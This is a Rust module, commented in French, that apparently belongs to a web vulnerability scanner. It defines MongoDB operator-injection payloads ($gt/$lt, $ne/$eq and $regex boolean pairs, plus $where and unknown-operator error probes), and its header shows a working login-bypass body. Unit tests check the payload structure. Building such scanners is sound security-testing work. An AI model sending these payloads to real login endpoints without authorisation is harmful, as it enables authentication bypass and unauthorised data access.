#![deny(unsafe_code)]

//! `NoSQL` (MongoDB) operator injection payloads.
//!
//! Les logins REST modernes (`{"user": ..., "pass": ...}`) délèguent
//! parfois directement à MongoDB sans assainir les opérateurs :
//! `{"user": {"$gt": ""}, "pass": {"$gt": ""}}` est toujours vrai
//! (`$gt ""` matche toute chaîne non vide) → bypass sans identifiants.
//!
//! Chaque [`NosqlPayload`] porte :
//! - une paire booléenne TRUE/FALSE sous forme **chaîne** (Query / Form /
//!   Header / Cookie : la valeur est envoyée telle quelle, ex.
//!   `{"$gt": ""}` comme valeur de param) ;
//! - la même paire sous forme **opérateur JSON** (`serde_json::Value` objet)
//!   pour les bodies JSON (la feuille `{"user":"admin"}` devient
//!   `{"user":{"$gt":""}}` via `inject_json_operator`, pas une chaîne) ;
//! - une sonde d'erreur (`$where` JS invalide / opérateur inconnu) qui
//!   déclenche les messages MongoDB scrutés par [`super::detector`].

/// Paire TRUE/FALSE opérateur `$gt` / `$lt` sur chaîne vide.
///
/// `$gt ""` matche toute chaîne non vide (toujours vrai sur un login),
/// `$lt ""` ne matche rien (toujours faux : `""` est le minimum).
pub const TRUE_GT: &str = "{\"$gt\": \"\"}";
/// Faux pendant de [`TRUE_GT`].
pub const FALSE_LT: &str = "{\"$lt\": \"\"}";

/// Paire `$ne` / `$eq` sur sentinelle impossible.
///
/// `{"$ne": "injekt_nomatch_zzz"}` est vrai pour tout document existant
/// (sauf collision exacte avec la sentinelle), `{"$eq": ...}` est faux.
pub const TRUE_NE: &str = "{\"$ne\": \"injekt_nomatch_zzz\"}";
/// Faux pendant de [`TRUE_NE`].
pub const FALSE_EQ: &str = "{\"$eq\": \"injekt_nomatch_zzz\"}";

/// Paire `$regex` large / ancrée impossible.
pub const TRUE_REGEX: &str = "{\"$regex\": \".*\"}";
/// Faux pendant de [`TRUE_REGEX`].
pub const FALSE_REGEX: &str = "{\"$regex\": \"^injekt_nomatch_zzz$\"}";

/// Sonde d'erreur : `$where` JS syntaxiquement invalide → `SyntaxError`
/// côté MongoDB (canal erreur du détecteur).
pub const ERROR_WHERE: &str = "{\"$where\": \"(((\" }";
/// Sonde d'erreur : opérateur inconnu → `unknown operator`.
pub const ERROR_UNKNOWN_OP: &str = "{\"$invalidOpInjekt\": 1}";

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct NosqlPayload {
    /// Forme chaîne (Query / Form / Header / Cookie).
    pub true_payload: String,
    /// Forme chaîne du faux pendant.
    pub false_payload: String,
    /// Sonde d'erreur (chaîne).
    pub error_payload: String,
    /// Forme objet pour bodies JSON (`inject_json_operator`).
    pub true_operator: serde_json::Value,
    /// Faux pendant objet pour bodies JSON.
    pub false_operator: serde_json::Value,
    /// Nom du vecteur (`operator-gt`, `operator-ne`, `regex`).
    pub vector: String,
}

impl NosqlPayload {
    #[must_use]
    pub fn new(
        true_payload: impl Into<String>,
        false_payload: impl Into<String>,
        error_payload: impl Into<String>,
        true_operator: serde_json::Value,
        false_operator: serde_json::Value,
        vector: impl Into<String>,
    ) -> Self {
        Self {
            true_payload: true_payload.into(),
            false_payload: false_payload.into(),
            error_payload: error_payload.into(),
            true_operator,
            false_operator,
            vector: vector.into(),
        }
    }
}

/// Opérateur JSON parsé sans panique : le littéral est constant et valide ;
/// repli objet vide (jamais `None`, jamais de `panic`).
fn must_operator(literal: &str) -> serde_json::Value {
    serde_json::from_str(literal).unwrap_or(serde_json::Value::Object(serde_json::Map::new()))
}

/// Les 3 vecteurs `NoSQL` (budget L1 = 2 premiers, L3+ = tout).
#[must_use]
pub fn nosql_payloads() -> Vec<NosqlPayload> {
    vec![
        NosqlPayload::new(
            TRUE_GT,
            FALSE_LT,
            ERROR_WHERE,
            must_operator(TRUE_GT),
            must_operator(FALSE_LT),
            "operator-gt",
        ),
        NosqlPayload::new(
            TRUE_NE,
            FALSE_EQ,
            ERROR_UNKNOWN_OP,
            must_operator(TRUE_NE),
            must_operator(FALSE_EQ),
            "operator-ne",
        ),
        NosqlPayload::new(
            TRUE_REGEX,
            FALSE_REGEX,
            ERROR_WHERE,
            must_operator(TRUE_REGEX),
            must_operator(FALSE_REGEX),
            "regex",
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn three_vectors_with_true_false_error() {
        let v = nosql_payloads();
        assert_eq!(v.len(), 3);
        for p in &v {
            assert_ne!(p.true_payload, p.false_payload);
            assert!(!p.error_payload.is_empty());
            assert!(!p.vector.is_empty());
            assert!(p.true_operator.is_object(), "vector {}", p.vector);
            assert!(p.false_operator.is_object(), "vector {}", p.vector);
        }
    }

    #[test]
    fn gt_pair_is_empty_string_comparison() {
        let v = nosql_payloads();
        assert_eq!(v[0].vector, "operator-gt");
        assert!(v[0].true_payload.contains("$gt"));
        assert!(v[0].false_payload.contains("$lt"));
    }

    #[test]
    fn operators_roundtrip_through_serde() {
        for p in nosql_payloads() {
            let t = serde_json::to_string(&p.true_operator).unwrap_or_default();
            let f = serde_json::to_string(&p.false_operator).unwrap_or_default();
            assert_ne!(t, f);
            assert!(t.contains('$'));
        }
    }
}
